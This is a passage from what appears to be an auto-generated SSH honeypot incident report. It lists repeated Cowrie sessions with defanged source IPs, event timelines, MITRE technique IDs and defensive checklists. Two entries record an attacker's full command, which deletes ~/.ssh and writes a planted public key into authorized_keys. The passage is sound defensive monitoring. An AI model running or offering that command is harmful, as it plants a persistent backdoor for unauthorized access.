| `2026-07-13 06:49:37` | `cowrie.session.connect` |
| `2026-07-13 06:49:38` | `cowrie.client.version` |
| `2026-07-13 06:49:38` | `cowrie.client.kex` |
| `2026-07-13 06:49:40` | `cowrie.login.success` |
| `2026-07-13 06:49:41` | `cowrie.session.params` |
| `2026-07-13 06:49:41` | `cowrie.command.input` |
| `2026-07-13 06:49:42` | `cowrie.log.closed` |
| `2026-07-13 06:49:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73c6cc8d2d98

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:49 |
| **Last Seen** | 2026-07-13 06:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:49:44` | `cowrie.session.connect` |
| `2026-07-13 06:49:44` | `cowrie.client.version` |
| `2026-07-13 06:49:44` | `cowrie.client.kex` |
| `2026-07-13 06:49:46` | `cowrie.login.success` |
| `2026-07-13 06:49:48` | `cowrie.session.params` |
| `2026-07-13 06:49:48` | `cowrie.command.input` |
| `2026-07-13 06:49:48` | `cowrie.log.closed` |
| `2026-07-13 06:49:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15fff319ffb0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:49 |
| **Last Seen** | 2026-07-13 06:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:49:50` | `cowrie.session.connect` |
| `2026-07-13 06:49:51` | `cowrie.client.version` |
| `2026-07-13 06:49:51` | `cowrie.client.kex` |
| `2026-07-13 06:49:53` | `cowrie.login.success` |
| `2026-07-13 06:49:55` | `cowrie.session.params` |
| `2026-07-13 06:49:55` | `cowrie.command.input` |
| `2026-07-13 06:49:56` | `cowrie.log.closed` |
| `2026-07-13 06:49:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cf603a8fdd3

| Field | Detail |
|---|---|
| **Source IP** | `128.14.225[.]164` |
| **First Seen** | 2026-07-13 06:49 |
| **Last Seen** | 2026-07-13 06:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:49:51` | `cowrie.session.connect` |
| `2026-07-13 06:49:51` | `cowrie.client.version` |
| `2026-07-13 06:49:51` | `cowrie.client.kex` |
| `2026-07-13 06:49:52` | `cowrie.login.success` |
| `2026-07-13 06:49:52` | `cowrie.session.params` |
| `2026-07-13 06:49:52` | `cowrie.command.input` |
| `2026-07-13 06:49:52` | `cowrie.command.failed` |
| `2026-07-13 06:49:53` | `cowrie.log.closed` |
| `2026-07-13 06:49:53` | `cowrie.session.params` |
| `2026-07-13 06:49:53` | `cowrie.command.input` |
| `2026-07-13 06:49:53` | `cowrie.session.file_download` |
| `2026-07-13 06:49:53` | `cowrie.log.closed` |
| `2026-07-13 06:49:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.14.225[.]164` to AbuseIPDB if not already reported
- [ ] Block `128.14.225[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-964697342e3e

| Field | Detail |
|---|---|
| **Source IP** | `128.14.225[.]164` |
| **First Seen** | 2026-07-13 06:49 |
| **Last Seen** | 2026-07-13 06:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:49:54` | `cowrie.session.connect` |
| `2026-07-13 06:49:54` | `cowrie.client.version` |
| `2026-07-13 06:49:54` | `cowrie.client.kex` |
| `2026-07-13 06:49:54` | `cowrie.login.success` |
| `2026-07-13 06:49:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.14.225[.]164` to AbuseIPDB if not already reported
- [ ] Block `128.14.225[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce563e7fb655

| Field | Detail |
|---|---|
| **Source IP** | `128.14.225[.]164` |
| **First Seen** | 2026-07-13 06:49 |
| **Last Seen** | 2026-07-13 06:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:49:54` | `cowrie.session.connect` |
| `2026-07-13 06:49:54` | `cowrie.client.version` |
| `2026-07-13 06:49:55` | `cowrie.client.kex` |
| `2026-07-13 06:49:55` | `cowrie.login.success` |
| `2026-07-13 06:49:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.14.225[.]164` to AbuseIPDB if not already reported
- [ ] Block `128.14.225[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c1e73294fbe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:49 |
| **Last Seen** | 2026-07-13 06:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:49:57` | `cowrie.session.connect` |
| `2026-07-13 06:49:58` | `cowrie.client.version` |
| `2026-07-13 06:49:58` | `cowrie.client.kex` |
| `2026-07-13 06:49:58` | `cowrie.login.success` |
| `2026-07-13 06:49:59` | `cowrie.session.params` |
| `2026-07-13 06:49:59` | `cowrie.command.input` |
| `2026-07-13 06:49:59` | `cowrie.log.closed` |
| `2026-07-13 06:49:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55b1aa70ed49

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:50 |
| **Last Seen** | 2026-07-13 06:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:50:04` | `cowrie.session.connect` |
| `2026-07-13 06:50:04` | `cowrie.client.version` |
| `2026-07-13 06:50:04` | `cowrie.client.kex` |
| `2026-07-13 06:50:05` | `cowrie.login.success` |
| `2026-07-13 06:50:06` | `cowrie.session.params` |
| `2026-07-13 06:50:06` | `cowrie.command.input` |
| `2026-07-13 06:50:07` | `cowrie.log.closed` |
| `2026-07-13 06:50:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95d775ffced3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:50 |
| **Last Seen** | 2026-07-13 06:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:50:09` | `cowrie.session.connect` |
| `2026-07-13 06:50:10` | `cowrie.client.version` |
| `2026-07-13 06:50:10` | `cowrie.client.kex` |
| `2026-07-13 06:50:12` | `cowrie.login.success` |
| `2026-07-13 06:50:13` | `cowrie.session.params` |
| `2026-07-13 06:50:13` | `cowrie.command.input` |
| `2026-07-13 06:50:13` | `cowrie.log.closed` |
| `2026-07-13 06:50:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac0a20b0b632

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:50 |
| **Last Seen** | 2026-07-13 06:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:50:16` | `cowrie.session.connect` |
| `2026-07-13 06:50:17` | `cowrie.client.version` |
| `2026-07-13 06:50:17` | `cowrie.client.kex` |
| `2026-07-13 06:50:18` | `cowrie.login.success` |
| `2026-07-13 06:50:18` | `cowrie.session.params` |
| `2026-07-13 06:50:18` | `cowrie.command.input` |
| `2026-07-13 06:50:19` | `cowrie.log.closed` |
| `2026-07-13 06:50:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79f92b39fbb9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:50 |
| **Last Seen** | 2026-07-13 06:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:50:23` | `cowrie.session.connect` |
| `2026-07-13 06:50:23` | `cowrie.client.version` |
| `2026-07-13 06:50:23` | `cowrie.client.kex` |
| `2026-07-13 06:50:24` | `cowrie.login.success` |
| `2026-07-13 06:50:25` | `cowrie.session.params` |
| `2026-07-13 06:50:25` | `cowrie.command.input` |
| `2026-07-13 06:50:26` | `cowrie.log.closed` |
| `2026-07-13 06:50:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-291cbe8b6ac2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:50 |
| **Last Seen** | 2026-07-13 06:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:50:30` | `cowrie.session.connect` |
| `2026-07-13 06:50:30` | `cowrie.client.version` |
| `2026-07-13 06:50:30` | `cowrie.client.kex` |
| `2026-07-13 06:50:31` | `cowrie.login.success` |
| `2026-07-13 06:50:32` | `cowrie.session.params` |
| `2026-07-13 06:50:32` | `cowrie.command.input` |
| `2026-07-13 06:50:32` | `cowrie.log.closed` |
| `2026-07-13 06:50:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70ba7f132724

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:50 |
| **Last Seen** | 2026-07-13 06:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:50:36` | `cowrie.session.connect` |
| `2026-07-13 06:50:36` | `cowrie.client.version` |
| `2026-07-13 06:50:36` | `cowrie.client.kex` |
| `2026-07-13 06:50:37` | `cowrie.login.success` |
| `2026-07-13 06:50:38` | `cowrie.session.params` |
| `2026-07-13 06:50:38` | `cowrie.command.input` |
| `2026-07-13 06:50:38` | `cowrie.log.closed` |
| `2026-07-13 06:50:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6db0a401da1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:50 |
| **Last Seen** | 2026-07-13 06:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:50:42` | `cowrie.session.connect` |
| `2026-07-13 06:50:42` | `cowrie.client.version` |
| `2026-07-13 06:50:42` | `cowrie.client.kex` |
| `2026-07-13 06:50:44` | `cowrie.login.success` |
| `2026-07-13 06:50:45` | `cowrie.session.params` |
| `2026-07-13 06:50:45` | `cowrie.command.input` |
| `2026-07-13 06:50:45` | `cowrie.log.closed` |
| `2026-07-13 06:50:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c683c1a0eed9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:50 |
| **Last Seen** | 2026-07-13 06:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:50:48` | `cowrie.session.connect` |
| `2026-07-13 06:50:48` | `cowrie.client.version` |
| `2026-07-13 06:50:48` | `cowrie.client.kex` |
| `2026-07-13 06:50:49` | `cowrie.login.success` |
| `2026-07-13 06:50:50` | `cowrie.session.params` |
| `2026-07-13 06:50:50` | `cowrie.command.input` |
| `2026-07-13 06:50:50` | `cowrie.log.closed` |
| `2026-07-13 06:50:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-803c7c80c67f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:50 |
| **Last Seen** | 2026-07-13 06:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:50:55` | `cowrie.session.connect` |
| `2026-07-13 06:50:55` | `cowrie.client.version` |
| `2026-07-13 06:50:55` | `cowrie.client.kex` |
| `2026-07-13 06:50:56` | `cowrie.login.success` |
| `2026-07-13 06:50:57` | `cowrie.session.params` |
| `2026-07-13 06:50:57` | `cowrie.command.input` |
| `2026-07-13 06:50:58` | `cowrie.log.closed` |
| `2026-07-13 06:50:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dd915083a84

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:51 |
| **Last Seen** | 2026-07-13 06:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:51:02` | `cowrie.session.connect` |
| `2026-07-13 06:51:02` | `cowrie.client.version` |
| `2026-07-13 06:51:02` | `cowrie.client.kex` |
| `2026-07-13 06:51:03` | `cowrie.login.success` |
| `2026-07-13 06:51:05` | `cowrie.session.params` |
| `2026-07-13 06:51:05` | `cowrie.command.input` |
| `2026-07-13 06:51:05` | `cowrie.log.closed` |
| `2026-07-13 06:51:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-110ea2491bfa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:51 |
| **Last Seen** | 2026-07-13 06:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:51:09` | `cowrie.session.connect` |
| `2026-07-13 06:51:09` | `cowrie.client.version` |
| `2026-07-13 06:51:09` | `cowrie.client.kex` |
| `2026-07-13 06:51:11` | `cowrie.login.success` |
| `2026-07-13 06:51:12` | `cowrie.session.params` |
| `2026-07-13 06:51:12` | `cowrie.command.input` |
| `2026-07-13 06:51:12` | `cowrie.log.closed` |
| `2026-07-13 06:51:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b15c87d0ea97

| Field | Detail |
|---|---|
| **Source IP** | `172.96.182[.]111` |
| **First Seen** | 2026-07-13 06:51 |
| **Last Seen** | 2026-07-13 06:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:51:15` | `cowrie.session.connect` |
| `2026-07-13 06:51:15` | `cowrie.client.version` |
| `2026-07-13 06:51:15` | `cowrie.client.kex` |
| `2026-07-13 06:51:15` | `cowrie.login.success` |
| `2026-07-13 06:51:16` | `cowrie.session.params` |
| `2026-07-13 06:51:16` | `cowrie.command.input` |
| `2026-07-13 06:51:16` | `cowrie.command.failed` |
| `2026-07-13 06:51:16` | `cowrie.log.closed` |
| `2026-07-13 06:51:17` | `cowrie.session.params` |
| `2026-07-13 06:51:17` | `cowrie.command.input` |
| `2026-07-13 06:51:17` | `cowrie.session.file_download` |
| `2026-07-13 06:51:17` | `cowrie.log.closed` |
| `2026-07-13 06:51:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.96.182[.]111` to AbuseIPDB if not already reported
- [ ] Block `172.96.182[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e03a006cc26

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:51 |
| **Last Seen** | 2026-07-13 06:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:51:16` | `cowrie.session.connect` |
| `2026-07-13 06:51:16` | `cowrie.client.version` |
| `2026-07-13 06:51:17` | `cowrie.client.kex` |
| `2026-07-13 06:51:18` | `cowrie.login.success` |
| `2026-07-13 06:51:19` | `cowrie.session.params` |
| `2026-07-13 06:51:19` | `cowrie.command.input` |
| `2026-07-13 06:51:19` | `cowrie.log.closed` |
| `2026-07-13 06:51:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55064fe2a185

| Field | Detail |
|---|---|
| **Source IP** | `172.96.182[.]111` |
| **First Seen** | 2026-07-13 06:51 |
| **Last Seen** | 2026-07-13 06:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:51:17` | `cowrie.session.connect` |
| `2026-07-13 06:51:17` | `cowrie.client.version` |
| `2026-07-13 06:51:17` | `cowrie.client.kex` |
| `2026-07-13 06:51:17` | `cowrie.login.success` |
| `2026-07-13 06:51:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.96.182[.]111` to AbuseIPDB if not already reported
- [ ] Block `172.96.182[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89e58e8c40b2

| Field | Detail |
|---|---|
| **Source IP** | `172.96.182[.]111` |
| **First Seen** | 2026-07-13 06:51 |
| **Last Seen** | 2026-07-13 06:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:51:18` | `cowrie.session.connect` |
| `2026-07-13 06:51:18` | `cowrie.client.version` |
| `2026-07-13 06:51:18` | `cowrie.client.kex` |
| `2026-07-13 06:51:18` | `cowrie.login.success` |
| `2026-07-13 06:51:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.96.182[.]111` to AbuseIPDB if not already reported
- [ ] Block `172.96.182[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7577b283f896

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:51 |
| **Last Seen** | 2026-07-13 06:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:51:22` | `cowrie.session.connect` |
| `2026-07-13 06:51:22` | `cowrie.client.version` |
| `2026-07-13 06:51:22` | `cowrie.client.kex` |
| `2026-07-13 06:51:24` | `cowrie.login.success` |
| `2026-07-13 06:51:25` | `cowrie.session.params` |
| `2026-07-13 06:51:25` | `cowrie.command.input` |
| `2026-07-13 06:51:26` | `cowrie.log.closed` |
| `2026-07-13 06:51:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f95993373ca0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:51 |
| **Last Seen** | 2026-07-13 06:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:51:28` | `cowrie.session.connect` |
| `2026-07-13 06:51:28` | `cowrie.client.version` |
| `2026-07-13 06:51:28` | `cowrie.client.kex` |
| `2026-07-13 06:51:30` | `cowrie.login.success` |
| `2026-07-13 06:51:32` | `cowrie.session.params` |
| `2026-07-13 06:51:32` | `cowrie.command.input` |
| `2026-07-13 06:51:32` | `cowrie.log.closed` |
| `2026-07-13 06:51:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7adf1440376

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:51 |
| **Last Seen** | 2026-07-13 06:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:51:35` | `cowrie.session.connect` |
| `2026-07-13 06:51:35` | `cowrie.client.version` |
| `2026-07-13 06:51:35` | `cowrie.client.kex` |
